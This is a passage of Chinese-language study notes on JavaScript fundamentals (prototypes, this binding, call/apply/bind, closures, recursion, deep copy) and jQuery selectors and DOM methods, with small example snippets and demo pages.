    Person.prototype.height=100;
    Person.prototype.play=function () {
      console.log("玩的好开心");
    };
    var obj2={};
    //Person的构造中有原型prototype,prototype就是一个对象,那么里面,age,sex,height,play都是该对象中的属性或者方法

    for(var key in Person.prototype){
      obj2[key]=Person.prototype[key];
    }
    console.dir(obj2);
    obj2.play();
```

>[danger] #####  赋值继承
```
   var obj1={
     name:"小糊涂",
     age:20,
     sleep:function () {
      console.log("睡觉了");
     }
   };

   //改变了地址的指向
   var obj2=obj1;
   console.log(obj2.name,obj2.age);
   obj2.sleep();
```
[TOC]

>[success] # 声明和表达式
```
1.函数声明如果放在if-else的语句中,在IE8的浏览器中会出现问题
2.以后宁愿用函数表达式,都不用函数声明
```
```
    //函数声明
//
//    if(true){
//      function f1() {
//        console.log("哈哈,我又变帅了");
//      }
//    }else{
//      function f1() {
//        console.log("小苏好猥琐");
//      }
//    }
//    f1();


    //函数表达式

    var ff;
    if(true){
      ff=function () {
        console.log("哈哈,我又变帅了");
      };
    }else{
      ff=function () {
        console.log("小苏好猥琐");
      };
    }
    ff();

 
```
[TOC]

>[success] # this 指向
```
BOM:中顶级对象是window,浏览器中所有的东西都是window的
```
```
1.普通函数中this     指向window
2.对象.方法中this    指向 当前实例对象
3.定时器方法中this   指向window
4.构造函数中this     指向对象
5.原型对象方法中this 指向对象
```
>[danger] ##### 普通函数
```
function f1() {
console.log(this);
}
f1();   // window
```
>[danger] ##### 定时器中的this
```
 setInterval(function () {
        console.log(this);
      },1000);  // window
```

>[danger] ##### 定时器中的this
```
 function Person() {
        console.log(this);
   //对象的方法
        this.sayHi=function () {
          console.log(this);
        };
      }    //指向person
```
[TOC]

>[success] # apply 和 call
```
1.apply和call都可以改变this的指向 
2. 把谁的方法给括号里面的对象
3. 改变后直接调用对应的方法
```
>[danger] ##### 使用方法
```
* apply的使用语法
* 函数名字.apply(对象,[参数1,参数2,...]);
* 方法名字.apply(对象,[参数1,参数2,...]);

* call的使用语法
* 函数名字.call(对象,参数1,参数2,...);
* 方法名字.call(对象,参数1,参数2,...);
```
>[danger] ##### 简单的使用
```
1.call  里面两个参数 第一个参数是被赋予的函数，第二个是对应参数
2.apply  里面两个参数 第一个参数是被赋予的函数，第二个是数组
3.apply和call方法中如果没有传入参数,或者是传入的是null,那么调用该方法的函数对象
中的this就是默认的window
```
```
function f1(x,y) {
    console.log("结果"+(x+y)+this);
    return "10000";
}
    f1(10,20)
    f1.call()
    f1.apply()
    f1.call(null)
    f1.apply(null)
    f1.call(null,10,20)
    f1.apply(null,[10,20])
    
打印结果都是：
结果30[object Window]
```
>[danger] ##### 函数的调用
```
function f1(x,y) {
    console.log("函数结果:"+(x+y)+this)
}
window.f1(10,20)
var obj1 = {
    age:10,
    sex:"男"
}
window.f1.apply(obj1,[10,20]);
```
>[danger] ##### 构造函数方法中的调用
```
1. 下面案例总stu没有sayHi方法
2. 但通过call和apply可以吧Person 的sayHi方法转嫁给Student
3. 把谁的方法给括号里面的对象
```
```
     function Person(sex) {
        this.sex = sex
    }
    Person.prototype.sayHi = function () {
        console.log("性别"+this.sex)
    };

    function Student(sex) {
        this.sex = sex
    };
    var per=new Person("男");
    var stu=new Student("妖");
    per.sayHi.apply(stu,);
    per.sayHi.call(stu,);
    
打印结果：
性别妖
```
[TOC]

>[success] # bind 改变指向通过复制
```
1.bind是用来复制一份
2.和call还是有apply 不同call他们直接调用，bind因为是复制所以给手动调用
3.函数名字.bind(对象,参数1,参数2,...);---->返回值是复制之后的这个函数
4.方法名字.bind(对象,参数1,参数2,...);---->返回值是复制之后的这个方法
```
>[danger] ##### 简单的使用
```
1.可以不填写参数，或者第一个参数为null 指向是之前函数的执行
2.给调用才能使用
```
```
function f1(x,y) {
    console.log(x+y)
}
var ff = f1.bind(null);
ff(10,20)

打印结果：
30
```
>[danger] ##### 函数的使用案例
```
1.下面的案例中ff 其实代指这f1 但这时的f1指向已经不是window 是per
```
```
    function f1(x,y) {
        console.log(this.age,x+y)
    }
    function Person(age) {
        this.age =age
    }

    var per = new Person(20)
    ff = f1.bind(per,10,20)
    ff()
 打印结果：
 20 30
```
>[danger] ##### 简单的案例
```
1.定时器中的指向是window，但使用bind后指向是当前对象
```
```

    //通过对象,调用方法,产生随机数

    function ShowRandom() {
      //1-10的随机数
      this.number=parseInt(Math.random()*10+1);
    }
    //添加原型方法
    ShowRandom.prototype.show1=function () {
      //改变了定时器中的this的指向了,本来应该是window,现在是实例对象了
      window.setInterval(this.show2.bind(this),1000);
    };
    //添加原型方法
    ShowRandom.prototype.show2=function () {
      //显示随机数--
      console.log(this.number);
    };
    //实例对象
    var sr=new ShowRandom();
    //调用方法,输出随机数字
    //调用这个方法一次,可以不停的产生随机数字
    sr.show1();
```
[TOC]

>[success] # 常见的几个函数成员
```
1.函数中有一个name属性----->函数的名字,name属性是只读的,不能修改
2.函数中有一个arguments属性--->实参的个数
3.函数中有一个length属性---->函数定义的时候形参的个数
4.函数中有一个caller属性---->调用(f1函数在f2函数中调用的,所以,此时调用者就是f2)
```
>[danger] ##### 案例
```
function f1(x,y) {
    console.log(f1.name)
    console.log(f1.arguments.length)
    console.log(f1.length)
    console.log(f1.caller);//调用者
}
   f1.name="f5";
   f1(10,20,30,40);
   console.dir(f1);
   
打印结果：
f1
4
2
null

// caller
    function f2() {
      console.log("f2函数的代码");
      f1(1,2);
    }
    f2();
打印结果：
f2函数的代码
f1
2
2
ƒ f2() {
      console.log("f2函数的代码");
      f1(1,2);
    }
```
[TOC]

>[success] # 把函数作为参数或者返回值使用

>[danger] ##### 函数作为参数
```
1.当参数的时候直接传入函数的名字，在函数内部进行声明调用
```
```
    function f1(fn){
        console.log("f1函数");
        fn();
    }
    // 匿名函数
    f1(function () {
        console.log("匿名函数")
    })
    // 命名函数
    function f2() {
        console.log("f2命名函数")
    }
    f1(f2)
```
>[danger] ##### 函数作为返回值
```
1.现在ff 代指就是 整个返回 函数 ，想调用就给加括号
```
```
    function f1() {
        console.log("函数f1")
        return function () {
            console.log('作为函数的返回使用')
        }
    }
    var ff =f1()
    // 现在ff 代指就是 整个返回 函数 ，想调用就给加括号
    ff()
```
>[danger] ##### 作为函数返回案例 -- 判断当前对象
```
1.typeof  --  得到当前数据类型
2.instanceof -- 判断当前类型是否属于对应类型
3.Object.prototype.toString -- 得当前类型样子
```
```
    var num = 10
    console.log(typeof num)
    var obj = {}
    console.log(obj instanceof Object)
    // 获取某个类型的样子，字符串形式输出
    var str = Object.prototype.toString.call([]) // toString 最开始的指向是Object 通过call 改变指向，用来判断括号内的指向
    console.log(str)
```
* 判断这个对象和传入的类型是不是同一个类型
```
    function getFunc(type) {
      return function (obj) {
        return Object.prototype.toString.call(obj) === type;
      }
    }

    var ff = getFunc("[object Array]");
    var result = ff([10, 20, 30]);
    console.log(result);
```
>[danger] ##### 函数作为参数使用 --- 数组例子
```
  var arr = [1, 100, 20, 200, 40, 50, 120, 10];
    //排序---函数作为参数使用,匿名函数作为sort方法的参数使用,那么此时的匿名函数中有两个参数,
    arr.sort(function (obj1,obj2) {
      if(obj1>obj2){
        return -1;
      }else if(obj1==obj2){
        return 0;
      }else{
        return 1;
      }
    });
    console.log(arr);
```
>[danger] ##### 函数作为返回值
```
1.因为排序需要的是函数返回
2.所以构造一个可以返回函数的方法
3.利用对象 进行保存
```
```
//三部电影,电影有名字,大小,上映时间
   function File(name, size, time) {
       this.name = name
       this.size = size
       this.time = time
   }

   var f1 = new File("jack.avi", "400M", "1997-12-12");
   var f2 = new File("tom.avi", "200M", "2017-12-12");
   var f3 = new File("xiaosu.avi", "800M", "2010-12-12");
   var arr = [f1, f2, f3];
   
   // 根据对象中的什么进行排序
   function fn(attr){
       return function getSort(obj1, obj2) {
           if (obj1[attr] > obj2[attr]) {
               return 1;
           } else if (obj1[attr] == obj2[attr]) {
               return 0;
           } else {
               return -1;
           } 
       }
   }
   // 用来接收函数返回值
   ff = fn('name')
    
    // 数组是吧函数参数当返回值 传入返回的函数
   arr.sort(ff);
   for (var i = 0; i < arr.length; i++) {
       console.log(arr[i].name + "====>" + arr[i].size + "===>" + arr[i].time);
   }
```
[TOC]
>[success] # 闭包
```
1.函数嵌套函数 或者对象，让其达到值读取外层函数的变量值，进行一种数据缓存
2.闭包的模式 --- 函数模式的闭包,对象模式的闭包
3.闭包的作用 --- 缓存数据,延长作用域链
4.闭包的优点和缺点 --- 缓存数据
```
>[danger] ##### 简单的案例理解
```
1.当调用最外层函数时，内层函数返回 赋值给外层的接受变量
2.外层的接受变量在调用 内层函数
```
```
     function f1() {
         var num = 10;
         function f2() {
             console.log(num)
         }
         f2()
     }
     f1()

    function f2() {
        var num =10;
        var obj={
            age:num
        };
        console.log(obj.age)
    }
    f3()

    function f3() {
        var num=3;
        return function () {
            return num
        }
    }
    ff3 = f3()
    console.log(ff3())

    function f4() {
        var num =100;
        return{
            age:num
        }
    }
    var obj =f4();
 console.log(obj.age)
```
>[danger] ##### 认识缓存机制
```
1.每次调用相当于重新生成函数，函数中的变量也被对应的重新初始化
```
```
function f1() {
    var num = 1;
    num ++;
    return num
}
console.log(f1())
console.log(f1())
console.log(f1())
打印结果：
2
2
2
```
* 想做到累加效果，不想让变量初始化，利用闭包
![](https://box.kancloud.cn/2a118c9ede335e5525103e42a58386de_633x261.png)
```
1.就是说 外层函数被创建一次，内层函数被多次调用，所以外层函数保存的变量不会改变，内层每次创建会根据外层最新值改变
```
```
function f1() {
    var num = 1;
    return function () {
        num ++
        return num
    }
}
ff1 = f1()
console.log(ff1())
console.log(ff1())
console.log(ff1())
打印结果：
2
3
4
```
>[danger] ##### 认识缓存机制（二）
```
    function showRandom() {
      var num=parseInt(Math.random()*10+1);
      console.log(num);
    }

    showRandom();
    showRandom();
    showRandom();

    //闭包的方式,产生三个随机数,但是都是相同的
    // 因为一直打印的都是 最外层函数变量

    function f1() {
      var num=parseInt(Math.random()*10+1);
      return function () {
        console.log(num);
      }
    }

    var ff=f1();

    ff();
    ff();
    ff();
   
```
>[danger] ##### 点赞案例
![](https://box.kancloud.cn/e8a0e85cb85d33f1dbcc12c09237b7f5_890x228.png)
```
1.不利用闭包会导致所有点赞读取公共的最外层变量
2.不管你点击按钮只会产生累加效果
```
```
    <style>
        ul{
            list-style-type: none;
        }
        li{
            float: left;
            margin-left: 10px;
        }
        img{
            width: 200px;
            height: 180px;
        }
        input{
            margin-left: 30%;
        }
    </style>
</head>
<body>
<ul>
    <li><img src="images/ly.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
    <li><img src="images/lyml.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
    <li><img src="images/fj.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
    <li><img src="images/bd.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
</ul>
<script>
    function  my$(tag){
        return document.getElementsByTagName(tag)
    }
    var inputObj = my$('input')
    var num = 1;
    for(var i=0;i<inputObj.length;i++){
        inputObj[i].onclick = function () {

            this.value = "赞("+(num++)+")"
        }
    }
</script>
```
* 利用闭包
```
1.将变量锁到 包里面
```
```
    <style>
        ul{
            list-style-type: none;
        }
        li{
            float: left;
            margin-left: 10px;
        }
        img{
            width: 200px;
            height: 180px;
        }
        input{
            margin-left: 30%;
        }
    </style>
</head>
<body>
<ul>
    <li><img src="images/ly.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
    <li><img src="images/lyml.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
    <li><img src="images/fj.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
    <li><img src="images/bd.jpg" alt=""><br/><input type="button" value="赞(1)"></li>
</ul>
<script>
    function  my$(tag){
        return document.getElementsByTagName(tag)
    }
    var inputObj = my$('input')
    function getValue() {
        var value =2;
        return function () {
            this.value="赞("+(value++)+")";
        }
    }
    for(var i=0;i<inputObj.length;i++){
        // 每次 调用内层函数，让内层函数变化外层函数不变，指向的是一个函数不加括号的函数
        inputObj[i].onclick = getValue()
    }
</script>
```
[TOC]
>[success] #  沙箱
```
1.创建一个自调用区域，变量函数和外界形成隔断，外界函数却依旧能传入
2.(function(....内容  ){} ( ) )
```
>[danger] ##### 案例
```
1.下面的案例会报错，在沙箱外面的无法访问沙箱里面
```
```
    (function () {
      var num = 10

    }())
    console.log(num)
```
```
1.打印结果10 沙箱可以访问外面的函数
```
```
 var num = 10;
    (function () {
        console.log(num)

    }())
```
>[danger] ##### 为什么 使用沙箱
```
1.例如当变量名字和 函数名一致是，就会报错 这时候就应该使用沙箱规避这种错误
```
```
<div>这是div</div>
<div>这是div</div>
<div>这是div</div>
<p>这是p</p>
<p>这是p</p>
<p>这是p</p>
<script>
  var getTag = 10;
  var dvObjs = 20;
  var pObjs = 30;
  (function () {
    //根据标签名字获取元素
    function getTag(tagName) {
      return document.getElementsByTagName(tagName)
    }
    //获取所有的div
    var dvObjs = getTag("div");
    for (var i = 0; i < dvObjs.length; i++) {
      dvObjs[i].style.border = "2px solid pink";
    }
    //获取所有的p
    var pObjs = getTag("p");
    for (var i = 0; i < pObjs.length; i++) {
      pObjs[i].style.border = "2px solid pink";
    }
  }());
  console.log(getTag);
  console.log(dvObjs);
  console.log(pObjs);
</script>
```
[TOC]
>[success] # 递归
```
1.递归:函数中调用函数自己,此时就是递归,递归一定要有结束的条件
2.递归就是将正序的逻辑 给倒序话
```
>[danger] ##### 理解正序逻辑倒序话
* 计算 1+2+3+4+5 的和
```
1.正序逻辑利用循环计算
```
```
   var sum = 0
    for(var i=1;i<=5;i++){
       sum+=i
    }
    console.log(sum)
```
```
1.递归倒序，也就是从5+4+3+2+1，当加到1的时候截止，所以截止条件就是正序开始条件
```
```
   function getSum(x) {
   		// 截止返回的是倒序逻辑的尾为条件
       if(x ==1){
           return 1
       }else{
           return x+getSum(x-1)
       }
   }
   console.log(getSum(5))
```
*  求斐波那契数列
```
    //递归案例:求斐波那契数列

    function getFib(x) {
      if(x==1||x==2){
        return 1
      }
      return getFib(x-1)+getFib(x-2);
    }
    console.log(getFib(12));
```
>[success] # 赋值、深浅copy
```
1.赋值就是指向同一个内存空间
2.浅copy就是基本类型指向分开，引用类型还是共同指向
3.深copy基本类型和引用类型分开，但引用类型内部的引用类型指向还是一样的
```
* 如图 来自百度经验

![](https://box.kancloud.cn/64871e11c39da614aa899377ac746c6a_771x855.png)

>[danger] ##### 赋值
```
1.通过赋值后，我们更改b变量的值
2.发现a变量随着b变量更改，这些是因为赋值，指向同一个区域，所以b改变a 也改变
```
```
    // 赋值
    var a = {
        name:"wang",
        song:["两只老虎","上海滩"]
    }
    var b = a
    b.name = "444"
    console.log(a.name)
    打印结果：
    444
```
>[danger] ##### 浅copy
```
1.基本类型不变，引用类型改变
```
```
   // copy
    var c = {
        name:"wang",
        song:["两只老虎","上海滩"]
    };
    d={}
    function extend(targeta, copyb) {
        for(var k in targeta){
            copyb[k] = targeta[k]
        }
    }
    extend(c,d)
    d.name = "ss"
    console.log(c.name)
    console.log(d.name)
    d.song.push("浅copy")
    console.log(c.song)
    console.log(d.song)
```
* 打印结果
![](https://box.kancloud.cn/02f00c7cd34fff4e8b469b4a6c5cf2aa_293x70.png)

>[danger] ##### 利用递归做深copy
```
1.如果被复制的对象v是引用类型，怎创建对应的引用类型中，然后套入这个方法，对这个引用类型复制
```
```
    // copy
    var c = {
        name:"wang",
        song:["两只老虎","上海滩"]
    };
    d={}
    function extend(a, b) {
        for(var k in a){
            var item =a[k]
            if(item instanceof Array){
                b[k] = []
                extend(item,b[k]);
            }else if(item instanceof Object){
                b[k]={};
                extend(item,b[k]);
            }else{
                b[k]=item;
            }
        }
    }
    extend(c,d)
    console.log(c)
    console.log(d)
```
[TOC]
>[success] # jquery
```
1.jQuery是一个快速、简洁的JavaScript框架
2.查找元素的方法多种多样
3.拥有隐式迭代特性，因此不再需要手写for循环 --- 重点特性
4.根据对应版本可以兼容浏览器
5.实现动画非常简单，而且功能更加的强大
6.代码简单
```
>[danger] ##### Jquery 版本
```
1.x版本：能够兼容IE678浏览器
2.x版本：不兼容IE678浏览器
1.x和2.x版本jquery都不再更新版本了，现在只更新3.x版本。

3.x版本：不兼容IE678，更加的精简
```
>[danger] ##### 关于压缩和未压缩版本
```
jquery.min.js:压缩版本，去除了注释、换行、空格、并且将一些变量替换成了a,b,c之类的简单字符，基本没有可读性，推荐在
项目生产环境使用，因为文件较小，减少网络压力。

jquery.js:未压缩版本，适用于学习与开发环境，源码清晰，易阅读。
```
>[danger] ##### 如何使用jquery
```
1.引入jquery 包
2.创建入口函数
3.功能实现
```
* 创建jquery 入口两种
```
$(function () {

})
```
```
// 用$方法把js 中的document对象转换成，jquery对象，调用jquery的ready方法
$(document).ready(function () {
        
    })
```
>[success] # js 和jquery 特点区别
```
1.jQuery是一个快速、简洁的JavaScript框架。那这个框架和js一些区别
```

>[danger] ##### 区别对比
|    | javaScript   |jquery    |
| --- | --- | --- |
| 入口函数上   |window.onlod =function () {} 只能有一个，如果有多个，后面的会覆盖前面  | $(function () {}) 可以有多个，并且不会发生覆盖的情况  |
|  代码容错性  |  代码容错性差，代码出现错误，会影响到后面代码的运行。  |  代码容错性好，屏蔽错误，并且不会影响后面代码的运行。  |
|  浏览器兼容性  |  兼容性差，比如火狐不支持innerText  | 对浏览器兼容性做了封装，因此不存在兼容性问题   |
|   操作复杂性|   DOM操作复杂，对于一些简单的动画效果，实现起来比较麻烦 | DOM操作简单，支持隐式迭代，实现动画非常简单   |

>[danger] ##### 个人感觉明显区别
```
1.JavaScript的入口函数要等到页面中所有资源（包括图片、文件）加载完成才开始执行。
2.jQuery的入口函数只会等待文档树加载完成就开始执行，并不会等待图片、文件的加载。
3.jQuery 会将一组数据绑定事件，不用想js 要for循环对每一个事件绑定
4.jQuery 和python Django中的orm 都使用链式调用，一个是返回jq对象一个是返回queryset对象
```
>[danger] ##### 代码直观体验 -- 骚操作
```
1.根据下面的代码可以看出jquery 最骚的操作是，自动循环内部每一个，dom对象
```

* 需求
```
1.点击按钮显示给div 增加 样式
2.点击设置内容给增加文字
```

* HTML
```
    <style>
        div {
            height: 200px;
            margin-bottom: 10px;
            background-color: #a43035;
            display: none;
        }
    </style>
</head>
<body>
<input type="button" value="展示" id="btn1">
<input type="button" value="设置内容" id="btn2">
<div></div>
<div></div>
<div></div>
```
* JS实现写法
```
<script>
    window.onload =function () {
        // 1.点击按钮显示给div 增加 样式
        // 2.点击设置内容给增加文字
        var btn1 = document.getElementById("btn1")
        var btn2 = document.getElementById("btn2")
        var divs = document.getElementsByTagName("div")
        // 显示
        btn1.onclick =function () {
            for(var i=0;i<divs.length;i++){
                divs[i].style.display = "block";
            }
        }

        // 隐藏
        btn2.onclick = function () {
            for (var i = 0; i < divs.length; i++) {
                //低版本火狐浏览器不支持innerText，支持textContent
                divs[i].innerText = "我是内容";
            }
        };
    }
</script>
```
* jquery 实现写法
```
// 引入jquery文件
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
       
        $('#btn1').click(function () {
            //隐式迭代：偷偷的遍历，给每一个对象增加动作
            $('div').show()
        });
        
        // 更改内容
        $("#btn2").click(function () {
            $("div").text("我是内容");
        });
    
    });
```

>[danger] ##### jquery 中的$ 是什么
```
1.因为$是一个方法，所以调用的时候要使用括号
```
```
console.log(typeof $)

打印结果：
function
```


[TOC]
>[success] # Dom 对象和jq对象不同的点深入
```
1.dom 对象是使用JavaScript中的方法获取页面中的元素返回的对象就是dom对象，dom对象只可以使用dom对象的方法和属性

2.jquery对象就是使用jquery的方法获取页面中的元素返回的对象就是jQuery对象，jquery对象只能使用jquery对象的方法
```
>[danger] ##### 代码层面了解
* html部分
```
<ul>
    <li id="first">1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
</ul>
``` 
* dom对象
```
var li = document.getElementById("first");
```
* jquery 对象
```
var $li = $('#first')
```

* 打印jq对象输出显示
```
// jQuery对象其实就是DOM对象的包装集（包装了DOM对象的集合（伪数组））
var $li = $('li')
console.log($li)
```
![](https://box.kancloud.cn/3eaef652797fccaa3b79c6602dd40414_519x215.png)

>[danger] ##### js 和jquery 相互转换
```
1.首先js和jquery 对象的方法不能相互调用
2.但通过转换，将js变成jq对象，或者将jq对象 变成js
```
* jquery 转换称 dom 两种方法
```
var $li = $(“li”);
//第一种方法（推荐使用），取出伪数组中对应的dom对象
$li[0]
//第二种方法
$li.get(0)
```

* dom转换成jquery
```
var li = document.getElementById("first");
// 用$()将dom对象包裹起来
var $li = $(li)
```

>[danger] ##### 网上的一个直观图
```
JavaScript是一门编程语言，jquery是用JavaScript实现的一个JavaScript库，目的是简化我们的开发。
```
![](https://box.kancloud.cn/45826015f50f53dbfe6b8a9b7747ec3d_721x504.png)
>[success] # jq 基本选择器
```
1.jQuery选择器有很多，基本兼容了CSS1到CSS3所有的选择器
```

>[danger] ##### 常见的css基本选择器
```
1.基础选择器，标签选择器，类选择器，ID选择器，通配符选着器
2.复合选择器，交集选择器，后代选着器，子代选择器，并集选择器
```
* 基本选择器

|  名称  |用法    |描述    |
| --- | --- | --- |
| ID选择器   | $(“#id”);   |  获取指定ID的元素  |
| 标签选择器   |  $(“div”);  | 获取同一类标签的所有元素   |
| 类选择器   | $(“.class”);   |  获取同一类class的元素  |
| 通配符选择器   | $(“*”);   |  匹配所有  |

* 复合选择器

|  名称  |用法    |描述    |
| --- | --- | --- |
| 交集选择器（标签指定式选择器）   |$(“div.redClass”); | 注意选择器1和选择器2之间没有空格，通过两个属性确定指定标签  |
| 并集选择器   |$(“div,p,li”);| 获取所有的div、p、li元素   |
| 子代选择器   | $(“ul>li”);   |  使用>号，获取儿子层级的元素，注意，并不会获取孙子层级的元素  |
| 后代选择器   | $(“ul li”);   |  使用空格，代表后代选择器，获取ul下的所有li元素，包括孙子等  |

>[danger] ##### 简单案例
```
<ul class="out">
    <li>
        <ul id="in">
            <li>12</li>
        </ul>
    </li>
</ul>
<div class="out">

</div>
<span>11</span>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        var $id = $("#in")
        var $class = $('.out')
        var $div = $('ul')
        var $intersection = $('div.out')
        var $join = $('div,span')
        var $son = $('.out>li')
        var $sonson = $('ul li')
        // id
        console.log($id)
        // class
        console.log($class)
        // ele
        console.log($div)
        // 交集
        console.log($intersection)
        // 并集
        console.log($join)
        // 子代选自器
        console.log($son)
        // 后代选择器
        console.log($sonson)

    })
</script>
```
![](https://box.kancloud.cn/b1e8cfdcbd5cdd9d5942f35ccf9d35cc_747x160.png)
[TOC]
>[success] # 过滤选择器
```
1.这类选择器都带冒号：可以直接匹配到对应条件的标签。
```
>[danger] ##### 总结表格

|    |  用法 | 描述   |
| --- | --- | --- |
|  :eq（index）  |  $(“li:eq(2)”).css(“color”, "red")  |   获取到的li元素中，选择索引号为2的元素，索引号index从0开始。 |
|  :lt（index）  |  $(“li:lt(2)”).css(“color”, ”red”);  |   获取到的li元素中，选择索引号小于2的元素，索引号index从0开始。 |
|  :gt（index）  |  $(“li:gt(2)”).css(“color”, ”red”);  |   获取到的li元素中，选择索引号大于2的元素，索引号index从0开始。 |
| :first |           $("li:first").css("backgroundColor", "red");|   获取第一个 |
| :last | $("li:last").css("backgroundColor", "yellow");   |   获取最后一个 |
|:odd    |  $(“li:odd”).css(“color”, ”red”);  | 获取到的li元素中，选择索引号为奇数的元素   |
| :even   |  $(“li:even”).css(“color”, ”red”);  |  获取到的li元素中，选择索引号为偶数的元素 |

>[success] # 案例

>[danger] ##### 案例的html
```
<ul>
    <li>我是第1个li</li>
    <li>我是第2个li</li>
    <li>我是第3个li</li>
    <li>我是第4个li</li>
    <li>我是第5个li</li>
</ul>
``` 

>[danger] ##### 获取第一个元素	/最后一个 -- :first/:last
![](https://box.kancloud.cn/ab69f1378fe0fe360a02cd25408f68bb_317x134.png)
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $("li:first").css("backgroundColor", "red");
        $("li:last").css("backgroundColor", "yellow");
    })
</script>
```
>[danger] ##### 匹配奇偶 -- :odd/:even
![](https://box.kancloud.cn/b9c4c649c7425ff9eced2ef339712f8c_266x111.png)
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
       // 从第0个元素开始 
        $("li:even").css("backgroundColor", "red");
        $("li:odd").css("backgroundColor", "yellow");
    })
</script>
```
>[danger] ##### 匹配元素指定索引 大/小/等 --:gt/:lt /:eq

![](https://box.kancloud.cn/5b14f36b16f33fe3c0a8100ff1039d87_331x142.png)
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        $("li:gt(2)").css("backgroundColor", "red");
        $("li:lt(2)").css("backgroundColor", "pink");
        $("li:eq(2)").css("backgroundColor", "yellow");
    })
</script>
```
>[success] # 常用的标签赛选选择器
```
1.已经得到一个标签，想获得的孙子，儿子。兄弟可以用这个方法
2.筛选选择器的功能与过滤选择器有点类似，但是用法不一样，筛选选择器主要是方法。
```
>[danger] ##### 总结的表格
```
1.selector -- 选择者，如果不填默认所有的符合，填了可以指定符合对象
```
|    | 用法   |说明    |
| --- | --- | --- |
| children(selector)   | $(“ul”).children(“li”)   | 相当于$(“ul>li”)，子类选择器   |
|  find(selector)  | $(“ul”).find(“li”);   |   相当于$(“ul li”),后代选择器 |
|  siblings(selector) | $(“#first”).siblings(“li”);   |    查找兄弟节点，不包括自己本身。|
|parent()    |$(“#first”).parent();    | 查找父亲   |
|eq(index)    | $(“li”).eq(2);   |  相当于$(“li:eq(2)”),index从0开始  |
| next()   |  $(“li”).next()  | 找下一个兄弟   |
| prev()   |  $(“li”).prev()  | 找上一次兄弟   |


>[success] # 知识案例储备
```
【案例：下拉菜单】this+children+mouseenter+mouseleave
【案例：突出展示】siblings+find
【案例：手风琴】next+parent
【案例：淘宝精品】index+eq
```
>[danger] ##### 了解jq css 属性
```
1.css(name, value);
2.name：需要设置的样式名称  ， value：对应的样式值
3.设置操作的时候，如果是多个元素，那么给所有的元素设置相同的值
2.获取操作的时候，如果是多个元素，那么只会返回第一个元素的值。
```
* 给标签赋值class 样式
```
$("#one").css("background","gray");//将背景色修改为灰色
```
* 给标签设置一组样式
```
// 表现形式
css(obj);
// 使用
$("#one").css({
    "background":"gray",
    "width":"400px",
    "height":"200px"
});
```
* 获取标签样式
```
//name:需要获取的样式名称
css(name);
//案例
$("div").css("background-color");
```

>[danger] ##### class 骚操作
* 添加样式 addClass
```
//name：需要添加的样式类名，注意参数不要带点.
addClass(name);
//例子,给所有的div添加one的样式。
$(“div”).addClass(“one”);
```

* 移除样式类
```
//name:需要移除的样式类名
removeClass(“name”);
//例子，移除div中one的样式类名
$(“div”).removeClass(“one”);
```

* 判断是否有样式
```
//name:用于判断的样式类名，返回值为true false
hasClass(name)
//例子，判断第一个div是否有one的样式类
$(“div”).hasClass(“one”);
```

* 切换样式
```
//name:需要切换的样式类名，如果有，移除该样式，如果没有，添加该样式。
toggleClass(name);
//例子
$(“div”).toggleClass(“one”);
```
>[success] # 鼠标悬停下拉菜单
```
1.mouseover：鼠标经过事件
  mouseout:鼠标离开事件
2.mouseenter:鼠标进入事件
  mouseleave：鼠标离开事件
3.推荐使用第二种，只会被触发单次
```
>[danger] ##### 案例
![](https://box.kancloud.cn/74aa0cff4165c20b18abc68682620180_312x126.png)
![](https://box.kancloud.cn/2228480cac5642f3e65053e87b77606a_715x158.png)
```
1.布局 用了两个ul相互嵌套模式
2.利用show 和hidden 对display 进行操作
3.找到 li 的jquery对象，为这个对象绑定鼠标移入移除动作
4.找到这个对象的儿子jq对象ul，对他进行显示操作
```
* 代码
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        ul{
            list-style: none;
        }
        .wrap{
            width: 330px;
            height: 30px;
            margin: 100px auto 0;
            padding-left: 10px;
        }
        .wrap > ul > li{
            float: left;
            margin-left: 10px;
            position: relative;
        }
        .wrap a {
            display: block;
            height: 30px;
            width: 100px;
            text-decoration: none;
            color: #000;
            line-height: 30px;
            text-align: center;
        }
        .wrap li ul {
            position: absolute;
            top: 30px;
            display: none;
        }
    </style>
</head>
<body>
<div class="wrap">
    <ul>
        <li>
            <a href="javascript:void(0);">一级菜单1</a>
            <ul class="ul">
                <li><a href="javascript:void(0);">二级菜单11</a></li>
                <li><a href="javascript:void(0);">二级菜单12</a></li>
                <li><a href="javascript:void(0);">二级菜单13</a></li>
            </ul>
        </li>
        <li>
            <a href="javascript:void(0);">一级菜单1</a>
            <ul class="ul">
                <li><a href="javascript:void(0);">二级菜单11</a></li>
                <li><a href="javascript:void(0);">二级菜单12</a></li>
                <li><a href="javascript:void(0);">二级菜单13</a></li>
            </ul>
        </li>
    </ul>
</div>
<script src="../jquery-1.12.4.js"></script>
<script>
    $(function () {
        var $li = $('.wrap>ul>li');
        
        // 鼠标进入事件
        $li.mouseenter(function () {
            $(this).children('ul').show()
        })

        // 鼠标离开事件
        $li.mouseleave(function () {
            $(this).children("ul").hide();
        });
    })
</script>
```

>[success] # 选中突出显示效果
![](https://box.kancloud.cn/9eff2415ddd5f982217511dc6813eaad_645x394.png)

>[danger] ##### 代码
```
1.给每个li 标签绑定事件，找到li标签
2.$(this).css("opacity", "1").siblings().css("opacity", "0.4"); 代码意思是，当前li透明度为1，他的其他兄弟标签为0.4
```
* html
```
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
        }

        ul {
            list-style: none;
        }

        body {
            background: #000;
        }

        .wrap {
            margin: 100px auto 0;
            width: 630px;
            height: 394px;
            padding: 10px 0 0 10px;
            background: #000;
            overflow: hidden;
            border: 1px solid #fff;
        }

        .wrap li {
            float: left;
            margin: 0 10px 10px 0;

        }

        .wrap img {
            display: block;
            border: 0;
        }
    </style>
</head>
<body>
<div class="wrap">
    <ul>
        <li><a href="#"><img src="images/01.jpg" alt=""/></a></li>
